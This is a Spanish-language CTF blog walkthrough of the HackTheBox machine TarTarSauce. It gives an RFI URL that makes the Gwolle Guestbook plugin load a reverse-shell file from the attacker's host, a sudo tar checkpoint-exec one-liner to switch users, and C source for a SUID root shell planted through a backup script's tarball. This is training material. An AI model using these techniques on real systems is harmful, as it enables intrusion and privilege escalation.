---
layout: single
title: Máquina TarTarSauce - HackTheBox (OSCP Style)
excerpt: "Resolución de la máquina TarTarSauce, la cual figura en la plataforma con un nivel de dificultad Medium."
date: 2021-09-21
classes: wide
header:
  teaser: /assets/images/tartarsauce/portada.png
  teaser_home_page: true
categories:
  - HTB
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

+ **Información de la máquina**
	
	![0]
	
+ Iniciamos la fase de reconocimiento con un escaneo rápido con ayuda de nmap en busca de puertos TCP abiertos.

	![1]
	
	El único puerto que está abierto es el 80, es decir, el HTTP.
	
+ Un escaneo más exhaustivo en busca de versiones y servicios no revela nueva información que sea de relevancia.

	![2]
	
+ Si realizamos una consulta con **whatweb** al servicio HTTP, tampoco nos revelará nueva información.

	![3]

+ Fuzzeamos con ayuda de **wfuzz** en busca de subdirectorios. Hay dos carpetas, sin embargo, solo una llama la atención: **webservices**.

	![4]
	
	Como siguiente paso, accedemos al servicio desde un navegador para continuar con la fase de reconocimiento:
	
	![5]
	
	No hay más que una página web con un dibujo de una salsa tártara en ASCII.
	
+ Si vemos el código fuente de la página, veremos que tiene una cantidad considerable de líneas vacías. Sin embargo, no es más que una broma, ya que al final del documento vemos un texto que dice: **Carry on, nothing to see here :D**. Vale, el asunto no va por aquí.

	![6]
	
+ Si accedemos al directorio **webservices**, nos encontraremos con un mensaje de Forbidden. Esto implica que no tenemos capacidad de directory listing, sin embargo, nos confirma que el directorio existe.

	![7]
	
	Debido a esto, procedemos a realizar otro fuzzing dentro de este directorio para encontrar nuevos subdirectorios:
	
	![8]
	
	Encontramos un directorio **wp**, indicándonos que en el servicio web corre un **Wordpress**.
	
	![9]

+ Si accedemos a este recurso dentro del servidor web, nos encontraremos con un servicio web mal configurado en cuanto a su estructura y estética. Esto nos puede indicar que, por detrás, se está aplicando virtual hosting en la máquina servidor, razón por la cual está intentando tomar recursos que no logra encontrar y renderizando de manera errónea la página.
	
	![10]
	
	Para confirmarlo, vemos el código fuente de la página para ver de qué servidor está intentando tomar los recursos. Vemos que intenta conectarse a **tartarsauce.htb**, dirección que no tenemos contemplada de nuestro lado.
	
	![11]
	
	Para que sea considerado el servidor, debemos añadir esta dirección a nuestro **/etc/hosts** para que las peticiones a dicho servidor redirijan a la IP del servicio.
	
	![12]
	
	Con esta corrección, ahora sí podremos ver la página web correctamente renderizada.
	
	![13]
	
	Siendo un servicio Wordpress, buscamos si el panel de logueo es accesible. Vemos que existe, sin embargo, por el momento no tenemos credenciales que probar para acceder.
	
	![14]
	
+ Como no tenemos más información con la que trabajar en la fase de reconocimiento, procedemos a fuzzear el servicio Wordpress en busca de plugins, con la esperanza de encontrar alguno que sea vulnerable.

	![15]
	
	Uno de los resultados que arroja el escaneo anterior es el plugin **Gwolle Guestbook**, un plugin para Wordpress que añade la funcionalidad de libro de visitas al sitio. Si buscamos este plugin en **searchsploit**, veremos que existe una versión de este que es vulnerable.
	
	![16]
	
	Este exploit plantea un Remote File Inclusion por culpa de la variable **abspath**, la cual no sanitiza su entrada y permite tomar de manera remota un archivo llamado **wp-load.php** de un servidor remoto (que será nuestra máquina de atacante) y lo carga en el plugin, renderizándolo y ejecutando lo que este archivo contenga. Queda claro lo que debemos hacer: Un archivo malicioso con el nombre **wp-load.php** que esté alojado en nuestra máquina por medio de un servidor HTTP básico en Python. Su contenido sería el siguiente:
	
	![17]
	
	Contempla únicamente la ejecución de **system()** con una reverse shell. Para este momento, ya tenemos el archivo servido con el servidor de Python. Como indica el exploit, debemos visitar la siguiente URL en el navegador, incluyendo al final de esta la ubicación de el archivo malicioso (RFI). Solo la ubicación general, es decir, sin la palabra **wp-load.php** ya que el mismo plugin lo añade por defecto.
	
	``http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.22/``
	
	![18]
	
	Si nos ponemos en escucha con netcat, y visitamos la URL mencionada, veremos que recibimos una conexión, ganando acceso al sistema.
	
	![19]
	
+ Después de un tratamiento de la TTY, comenzamos a enumerar el sistema en busca de, primero, la flag de usuario. Vemos un directorio dentro de **home**, que es el directorio del usuario **onuma**. Por desgracia, no podemos acceder a él. Esto nos indica que lo que debemos hacer a continuación es pivotear al usuario **onuma**. Para ello, primero listamos el **sudoers**, y nos encontramos con que podemos ejecutar **tar** como el usuario **onuma** sin necesidad de proporcionar contraseña.

	![20]
	
	Para escalar al usuario y spawnear una **bash** como el usuario **onuma** por medio de **tar**, debemos ejecutar el siguiente one liner:
	
	``sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash``

	![21]
	
	Ya como el usuario **onuma**, podremos acceder a su directorio y visualizar la flag de usuario.
	
	![22]

+ Ya llegando a este punto, lo único que resta es escalar privilegios para convertirnos en **root**, por lo que comenzamos a enumerar el sistema en busca de una ruta potencial para esto. Se enumeró lo siguiente:

	* Binarios SUID: FALSE
	* Tareas en el Crontab: FALSE
	* Contraseñas hardcodeadas en los archivos del servidor web: FALSE
	* Logs del usuario onuma: TRUE
	
	Dentro de el log que guarda el histórico del MySQL, encontramos algo acerca de un archivo llamado **backuperer**. Si hacemos un locate de este, veremos que es un binario que corre cada cierto tiempo en el sistema. ¿Por qué no apareció en **crontab**? Porque seguramente está configurado por fuera, recordemos que no todas las tareas que corren en segundo plano de manera recursiva cada cierta cantidad de tiempo están en el **crontab**.
	
	![23]
	
	Si hacemos un cat al archivo, veremos que no es más que un script programado en **bash** que ejecuta una serie de instrucciones con el objetivo de guardar un backup del servidor web y ver si ha habido alguna modificación desde el último backup, esto con el fin de informarlo al usuario.
	
	![24]
	
	El script hace lo siguiente:
	
	1. Genera un archivo comprimido con toda la información contenida en /var/www/html y lo almacena en la ruta /var/tmp con un nombre de archivo aleatorio.
	2. Espera un total de 30 segundos.
	3. Descomprime el contenido almacenado y lo compara con la información contenida en /var/www/html. Si hay diferencias, almacena esos cambios en un log para su posterior revisión por el usuario.
	4. Borra todos los archivos generados para volver a repetir este proceso dentro de 5 minutos.
	
	Podemos acceder a este vector de ataque haciendo un file inclusion de archivos del sistema. Pero lo que buscamos es una bash en el sistema. Lo que podemos hacer es generar un binario que spawnee una **bash** con el SUID activo, de tal manera que, al ejecutarlo en la máquina, ejecute la bash como root. El problema que esto implica es que, aunque nosotros en nuestra máquina generemos el binario, le demos permisos a root, y lo hagamos SUID, al momento de pasarlo a la máquina, este llegará con los permisos modificados por el usuario que inició la solicitud de archivo, en este caso, sería **onuma**. El truco está en aprovechar la compresión y descompresión de archivos para que estos permisos se mantengan al llegar a la máquina víctima. En este caso, como root ejecuta esta tarea **backuperer**, realizará la descompresión como dicho usuario, y entonces, tendremos nuestro binario con sus permisos originales en la máquina para spawnear la bash. El proceso implica "atrapar" el archivo comprimido que la máquina genere, sustituirlo por uno nuestro que contenga el SUID, y esperar a que se descomprima en el sistema para poder ejecutar el binario y ganar la bash como **root**.
	
	Si no se entendió el procedimiento, vamos paso a paso. En nuestra máquina de atacante generamos una estructura de directorios que sea del tipo /var/www/html.
	
	![25]
	
	Dentro de este último directorio (html) generamos un código fuente en C llamado **setuid.c** (el nombre no importa), el cual contenga el siguiente código:
	
	```
		#include <unistd.h>
		int main()
		{
			setuid(0);
			execl("/bin/bash", "bash", (char *)NULL);
			return 0;
		}
	```
	
	![26]
	
	Lo que este código hace es primero establecer un contexto SUID con la llamada a setuid(0), ejecuta una /bin/bash y termina el programa. Con este archivo creado, procedemos a compilarlo con GCC de la siguiente manera:
	
	``gcc -m32 -o setuid setuid.c``
	
	En nuestro caso, esta compilación generó el siguiente error.
	
	![27]
	
	Para corregirlo, solo debemos instalar la siguiente dependencia faltante:
	
	``libc6-dev-i386``
	
	![28]
	
	Volvemos a intentar compilar el código. Cuando este termina la compilación, le damos permisos SUID al binario generado:
	
	![29]
	
	![30]
	
	Ya con esto generado, lo comprimimos todo con tar:
	
	``tar -zcvf exploit var``
	
	Donde le indicamos a tar que queremos comprimir todo lo que esté dentro de la carpeta var en un archivo llamado exploit.
	
	![31]
	
+ En la máquina víctima, nos dirigimos a la ruta donde **backuperer** guarda el backup de /var/www/html, que es en /var/tmp y con **wget** solicitamos el comprimido malicioso a nuestra máquina de atacante.
	
	![32]
	
	Ahora solo debemos esperar a que **backuperer** se vuelva a ejecutar. Para ver cuánto tiempo falta, podemos ejecutar el siguiente comando:
	
	``systemctl list-timers``
	
	![33]
	
	Cuando se ejecute, recordemos, crea un comprimido de nombre aleatorio en el directorio /var/tmp y entonces espera 30 segundos. Esos 30 segundos son nuestra ventana para actuar, de lo contrario, deberemos repetir el proceso y esperar 5 minutos hasta que la tarea se vuelva a ejecutar.
	
	Listamos el contenido con **ls -al** y entonces borramos el comprimido original, posteriormente le cambiamos el nombre a nuestro comprimido malicioso por el nombre del comprimido original y esperamos.
	
	Cuando los 30 segundos hayan pasado, se generará una carpeta llamada **check**, dentro de la cual **root** ha descomprimido nuestro comprimido malicioso y se dispone a ver las diferencias entre este y el directorio web original (cosa que no es de nuestro interés ya). Si entramos a la carpeta, podremos visualizar nuestro binario SUID malicioso, y lo más interesante, que llegó con los permisos SUID intactos.
	
	![34]

+ Finalmente, solo debemos ejecutar el binario SUID y obtendremos una bash como el usuario **root**. Nos dirigimos al directorio root para visualizar la flag de root y con esto hemos finalizado de comprometer la máquina.

	![35]
	
[0]:/assets/images/tartarsauce/0.png
[1]:/assets/images/tartarsauce/1.png
[2]:/assets/images/tartarsauce/2.png
[3]:/assets/images/tartarsauce/3.png
[4]:/assets/images/tartarsauce/4.png
[5]:/assets/images/tartarsauce/5.png
[6]:/assets/images/tartarsauce/6.png
[7]:/assets/images/tartarsauce/7.png
[8]:/assets/images/tartarsauce/8.png
[9]:/assets/images/tartarsauce/9.png
[10]:/assets/images/tartarsauce/10.png
[11]:/assets/images/tartarsauce/11.png
[12]:/assets/images/tartarsauce/12.png
[13]:/assets/images/tartarsauce/13.png
[14]:/assets/images/tartarsauce/14.png
[15]:/assets/images/tartarsauce/15.png
[16]:/assets/images/tartarsauce/16.png
[17]:/assets/images/tartarsauce/17.png
[18]:/assets/images/tartarsauce/18.png
[19]:/assets/images/tartarsauce/19.png
[20]:/assets/images/tartarsauce/20.png
[21]:/assets/images/tartarsauce/21.png
[22]:/assets/images/tartarsauce/22.png
[23]:/assets/images/tartarsauce/23.png
[24]:/assets/images/tartarsauce/24.png
[25]:/assets/images/tartarsauce/25.png
[26]:/assets/images/tartarsauce/26.png
[27]:/assets/images/tartarsauce/27.png
[28]:/assets/images/tartarsauce/28.png
[29]:/assets/images/tartarsauce/29.png
[30]:/assets/images/tartarsauce/30.png
[31]:/assets/images/tartarsauce/31.png
[32]:/assets/images/tartarsauce/32.png
[33]:/assets/images/tartarsauce/33.png
[34]:/assets/images/tartarsauce/34.png
[35]:/assets/images/tartarsauce/35.png